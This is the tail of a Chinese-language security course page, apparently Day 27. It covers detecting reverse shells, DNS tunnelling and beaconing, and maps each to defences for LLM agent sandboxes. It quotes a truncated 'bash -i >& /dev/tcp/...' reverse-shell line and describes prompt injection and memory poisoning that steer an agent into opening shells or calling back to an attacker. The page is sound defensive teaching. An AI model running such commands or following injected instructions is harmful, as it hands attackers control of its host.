+<b>做完这个 lab 你应该能回答</b>：反弹 shell 在<b>网络层</b>留下了什么（一条到 4444 的 TCP 连接、方向是「victim 主动连 handler」）、在<b>主机层</b>留下了什么（异常进程、可疑命令行、connect 系统调用、pty spawn）。把这两层信息拼起来，就是一条能写成检测规则的攻击链——这正是你把「攻击原理」转化为「防御能力」的完整闭环。
+</div>
+
+<div class="connect" id="connect">
+<h2>与 AI / Agent 安全的连结</h2>
+
+<p><b>1 · Agent 的代码执行工具 = 现成的反弹 shell 跳板。</b>你做 Agent 安全，最危险的能力就是给 LLM Agent 配的 <code>code interpreter</code> / <code>shell tool</code>。一旦攻击者通过 prompt injection 让 Agent「帮我运行这段代码」，而那段代码正是一行 <code>bash -i >& /dev/tcp/...</code>，Agent 的沙箱就成了反弹 shell 的发起端。今天学的进程链检测（服务进程 fork shell + 外连）直接就是 Agent 沙箱的运行时监控规则。</p>
+
+<p><b>2 · 沙箱出站过滤是 Agent 安全的第一道墙。</b>本文反复强调 reverse shell 靠「出站宽松」得手。对 Agent 沙箱，正确的默认是<b>出站全拒、按需白名单</b>：code tool 不该能主动连任意外部 IP。你在 Day 57-62 学的 namespace / seccomp / 网络隔离，就是把这道墙落地的机制。理解攻击者要什么，才知道墙该砌在哪。</p>
+
+<p><b>3 · 数据外带（exfiltration）与 DNS 隧道。</b>被攻陷的 Agent 想把窃取的对话/知识库/密钥送出去，DNS 隧道是首选——因为很多沙箱允许 DNS 解析。你监控 Agent 沙箱时，对「异常长子域名、高频 DNS 查询」的检测，和本文第 4 节完全一致。Agent 的 RAG 检索、tool 调用产生的外部请求，都要按同样标准审查。</p>
+
+<p><b>4 · Beacon 思维 = 检测「被劫持的 Agent」的思路。</b>一个被 memory poisoning 或持久化 injection 控制的 Agent，会周期性地做一些「不像正常任务」的外连（比如定期回连攻击者拿新指令）。本文的 beaconing 检测（连接节律的统计规律）可以迁移到「Agent 行为基线」——正常 Agent 的工具调用模式 vs 被控 Agent 的异常周期性活动。</p>
+
+<p><b>5 · 纵深关联的检测哲学是通用的。</b>本文最后强调「单点规则脆弱、多信号关联稳健」。这正是 LLM/Agent 安全防御纵深的核心（你在 Day 55、Day 132、Day 160 会反复遇到）：input filter 会被绕过、output filter 会被绕过、单个 guardrail 都不可靠，唯有把「输入意图 + 工具调用 + 输出内容 + 网络行为」拼成一条链来判断，才稳。今天用反弹 shell 把这个哲学具象化了一遍。</p>
+</div>
+
+<h2 id="ex">今日小练习</h2>
+
+<div class="exercise">
+<span class="exercise-num">1</span><b>动手</b>：在你自己的本机（<code>127.0.0.1</code>，全程回环）完成第 8 节的 lab：起监听器 → Python 反弹 → 用 <code>lsof -i</code> / <code>ss -tnp</code> 找到那条连接和对应的两个进程 → 用 <code>ps --forest</code> 看到 python3 的完整命令行。写下：这条连接的「方向」是什么？哪个进程是 handler、哪个是被控端？清理时确认 4444 已释放。
+</div>
+
+<div class="exercise">
+<span class="exercise-num">2</span><b>观察</b>：在本机运行一次正常的 <code>nslookup example.com</code> 和一次 <code>dig TXT example.com</code>，用 <code>tcpdump -i lo0 -n port 53</code>（或你的实际网卡）抓包看 DNS 查询长什么样。然后思考：如果这是 DNS 隧道，查询名会有什么不同？把「正常 DNS 查询名」和「隧道查询名」的三点区别写出来（提示：长度、熵、频率）。
+</div>
+
+<div class="exercise">
+<span class="exercise-num">3</span><b>思考</b>：假设你要给一个带 <code>shell</code> 工具的 LLM Agent 设计沙箱，要防住「被 injection 后弹 shell 出去」。请列出至少 4 层防御（提示：从网络出站、进程能力、系统调用、行为监控四个层面各写一条），并说明每一层分别对应本文哪个攻击技术。这道题就是你本职工作的缩影。
+</div>
+
+<div class="next">
+<strong>明日预告 · Day 28（Week 04 周日 🌐 综合）</strong>：<b>一个 HTTP 请求的完整旅程 + 周复盘</b>。我们把 Week 03-04 学的网络知识串成一条完整链路——从浏览器输入 URL，经 DNS、TCP、TLS、负载均衡、Nginx 反代、一路到 K8s 里的后端服务，再原路返回。你会看到每一跳的延迟分布、瓶颈在哪、怎么定位故障，并从 Agent 安全视角审视这条链路上的每一个攻击面。这是把本阶段所有碎片拼成大图的一天。
+</div>
+
+<!-- nav-injected v1 -->
+<nav id="page-nav" style="display:flex;justify-content:space-between;align-items:center;margin:48px 0 16px;padding-top:20px;border-top:1px solid #e7e5e0;font-size:14px;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC',sans-serif;"></nav>
+<script>
+(function(){
+  var path = window.location.pathname;
+  var m = path.match(/(day|article)-(\d+)\.html$/i);
+  if (!m) return;
+  var type = m[1].toLowerCase();
+  var n = parseInt(m[2], 10);
+  var isDay = type === 'day';
+  var perWeek = isDay ? 7 : 3;
+  var total = 168, accent='#c2410c', soft='#fed7aa';
+  if (path.indexOf('security-plan') !== -1) { total=154; accent='#b91c1c'; soft='#fecaca'; }
+  if (path.indexOf('posttraining-plan') !== -1) { total=48; accent='#1e40af'; soft='#bfdbfe'; }
+  function urlFor(k){
+    var week = Math.ceil(k/perWeek);
+    return '../week-'+String(week).padStart(2,'0')+'/'+type+'-'+(isDay?String(k).padStart(2,'0'):String(k))+'.html';
+  }
+  var label = isDay ? '天' : '篇';
+  var prefix = isDay ? 'Day' : 'Article';
+  var linkS = 'color:'+accent+';text-decoration:none;padding:8px 18px;border:1px solid '+soft+';border-radius:6px;background:#fff;font-weight:500;';
+  var disS = 'color:#cbd5e1;padding:8px 18px;';
+  var prev = n>1 ? '<a href="'+urlFor(n-1)+'" style="'+linkS+'">← 上一'+label+'（'+prefix+' '+(n-1)+'）</a>' : '<span style="'+disS+'">← 上一'+label+'</span>';
+  var next = n<total ? '<a href="'+urlFor(n+1)+'" style="'+linkS+'">下一'+label+'（'+prefix+' '+(n+1)+'） →</a>' : '<span style="'+disS+'">下一'+label+' →</span>';
+  document.getElementById('page-nav').innerHTML = prev + next;
+})();
+</script>
+</body>
+</html>
